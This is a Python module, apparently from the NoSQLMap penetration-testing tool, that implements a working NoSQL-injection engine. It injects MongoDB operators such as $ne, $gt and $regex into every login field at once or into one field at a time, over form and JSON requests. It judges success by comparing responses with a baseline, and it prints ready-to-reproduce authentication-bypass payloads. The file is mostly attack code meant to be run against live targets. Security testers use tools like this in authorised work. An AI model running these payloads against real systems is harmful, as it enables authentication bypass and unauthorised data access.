#!/usr/bin/env python3
# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
# See the file 'doc/COPYING' for copying permission

# Modern web NoSQL-injection engine.
#
# Unlike the legacy getApps/postApps path, this engine:
#   * injects an operator into ALL credential-like fields at once (the common
#     login auth-bypass that single-parameter injection structurally misses),
#   * works over both urlencoded and JSON request bodies,
#   * decides with a per-target DIFFERENTIAL ORACLE instead of a fixed byte
#     threshold: it first measures the app's own response noise (two known-false
#     requests), then flags a payload only when its response diverges from the
#     baseline beyond that noise across status code, redirect, Set-Cookie,
#     length and content similarity.

import difflib
import json as _json
import random
import string
import time

import requests

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass


# Sentinel meaning "substitute a fresh random value at build time".
_RANDV = object()


def args():
    return []


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


class Probe:
    def __init__(self, resp, elapsed):
        self.status = resp.status_code
        self.location = resp.headers.get("Location", "")
        self.cookies = resp.headers.get("Set-Cookie", "")
        self.body = resp.text or ""
        self.length = len(self.body)
        self.elapsed = elapsed


def _build_form(fields):
    out = {}
    for name, spec in fields.items():
        if spec[0] == "lit":
            out[name] = spec[1]
        else:  # ("op", op, val)
            out["%s[%s]" % (name, spec[1])] = "" if spec[2] is None else spec[2]
    return out


def _build_json(fields):
    out = {}
    for name, spec in fields.items():
        if spec[0] == "lit":
            out[name] = spec[1]
        else:
            out[name] = {spec[1]: spec[2]}
    return out


def _send(method, url, vector, fields, headers, verify, timeout=15):
    kw = dict(headers=headers, allow_redirects=False, verify=verify, timeout=timeout)
    if method == "GET":
        kw["params"] = _build_form(fields)
    elif vector == "json":
        kw["json"] = _build_json(fields)
    else:
        kw["data"] = _build_form(fields)
    start = time.time()
    resp = requests.request(method, url, **kw)
    return Probe(resp, time.time() - start)


def _similarity(a, b):
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a, b).quick_ratio()


# Status codes that usually mean "blocked" (WAF/ratelimit) rather than a
# genuine injection signal.
_BLOCKING = {403, 406, 429, 501}


def _signal(true_p, base_p, noise_len, noise_ratio):
    # Return (reasons, strong).  'strong' is False when the only difference is a
    # blocking status change, which is more likely a WAF than confirmed injection.
    reasons = []
    positive = False
    if true_p.status != base_p.status:
        reasons.append("status %s->%s" % (base_p.status, true_p.status))
        if true_p.status not in _BLOCKING:
            positive = True
    if true_p.location and true_p.location != base_p.location:
        reasons.append("redirect->%s" % true_p.location)
        positive = True
    if true_p.cookies and not base_p.cookies:
        reasons.append("session cookie set")
        positive = True
    len_delta = abs(true_p.length - base_p.length)
    if len_delta > max(noise_len * 3, 40):
        reasons.append("len %d vs base %d (noise %d)" % (true_p.length, base_p.length, noise_len))
        positive = True
    ratio = _similarity(true_p.body, base_p.body)
    if ratio < min(noise_ratio - 0.10, 0.92):
        reasons.append("content divergence %.2f (noise %.2f)" % (ratio, noise_ratio))
        positive = True
    return reasons, positive


def _op_specs():
    # (label, op, value)  -- value _RANDV means a fresh random per candidate.
    return [
        ("$ne:<rand>", "$ne", _RANDV),
        ("$gt:''", "$gt", ""),
        ("$regex:.*", "$regex", ".*"),
        ("$ne:null", "$ne", None),
    ]


def _resolve(v):
    return _rand() if v is _RANDV else v


def _candidates(fields_literal):
    names = list(fields_literal.keys())
    cands = []
    # A) auth-bypass: operator-inject EVERY field simultaneously.
    for lbl, op, val in _op_specs():
        spec = {n: ("op", op, _resolve(val)) for n in names}
        cands.append(("all-fields %s" % lbl, spec))
    # B) single-field: inject one field, keep the rest at their real values
    #    (covers data endpoints like ?id=5 -> id[$ne]).
    if len(names) > 1:
        for f in names:
            for lbl, op, val in _op_specs():
                spec = {n: ("lit", fields_literal[n]) for n in names}
                spec[f] = ("op", op, _resolve(val))
                cands.append(("%s %s" % (f, lbl), spec))
    return cands


def detect(base_url, method, fields_literal, headers=None, verify=False):
    method = method.upper()
    vectors = ["form"] if method == "GET" else ["form", "json"]
    findings = []

    for vector in vectors:
        def false_probe():
            f = {n: ("lit", _rand()) for n in fields_literal}
            return _send(method, base_url, vector, f, headers, verify)

        # Calibrate this target's natural noise with two known-false requests.
        try:
            base = false_probe()
            base2 = false_probe()
        except requests.RequestException as e:
            print("  [%s] could not reach target: %s" % (vector, e))
            continue
        noise_len = abs(base.length - base2.length)
        noise_ratio = _similarity(base.body, base2.body)

        for label, spec in _candidates(fields_literal):
            try:
                t = _send(method, base_url, vector, spec, headers, verify)
            except requests.RequestException:
                continue
            reasons, positive = _signal(t, base, noise_len, noise_ratio)
            if not reasons:
                continue
            # Confirm: re-run once and require the signal again (kills flukes).
            try:
                t2 = _send(method, base_url, vector, spec, headers, verify)
            except requests.RequestException:
                continue
            reasons2, positive2 = _signal(t2, base, noise_len, noise_ratio)
            if not reasons2:
                continue
            findings.append({
                "vector": vector, "label": label, "spec": spec,
                "reasons": reasons2, "strong": positive and positive2,
                "status": t.status, "length": t.length, "base_length": base.length,
            })
    return findings


def _payload_repr(spec, method, vector):
    if vector == "json" and method != "GET":
        return _json.dumps(_build_json(spec))
    form = _build_form(spec)
    return "&".join("%s=%s" % (k, v) for k, v in form.items())


def run(base_url, method, fields_literal, headers=None, verify=False, args=None):
    print("Modern NoSQL Web Injection (differential oracle)")
    print("================================================")
    print("Target: %s [%s]" % (base_url, method.upper()))
    print("Fields: %s" % (", ".join(fields_literal.keys()) or "(none)"))
    print("")

    if not fields_literal:
        print("No parameters to test.  Provide query params (GET) or POST data.")
        if args is None:
            input("\nPress enter to continue...")
        return []

    findings = detect(base_url, method, fields_literal, headers, verify)

    print("")
    strong = [f for f in findings if f["strong"]]
    weak = [f for f in findings if not f["strong"]]

    if not strong and not weak:
        print("No NoSQL injection detected.")
    else:
        if strong:
            seen = set()
            print("=== NoSQL INJECTION CONFIRMED ===")
            for f in strong:
                key = (f["vector"], f["label"])
                if key in seen:
                    continue
                seen.add(key)
                print("[+] %s  (%s vector)" % (f["label"], f["vector"]))
                print("    signals : %s" % "; ".join(f["reasons"]))
                print("    payload : %s" % _payload_repr(f["spec"], method, f["vector"]))

            ab = [f for f in strong if f["label"].startswith("all-fields")]
            if ab:
                print("")
                print("[!] AUTHENTICATION BYPASS: every field accepts a simultaneous")
                print("    operator injection.  Reproduce with:")
                print("    %s" % _payload_repr(ab[0]["spec"], method, ab[0]["vector"]))

        if weak:
            print("")
            print("=== POSSIBLE (status-only change, may be a WAF) ===")
            for f in weak:
                print("[?] %s (%s): %s" % (f["label"], f["vector"], "; ".join(f["reasons"])))

    if args is None:
        input("\nPress enter to continue...")
    return findings
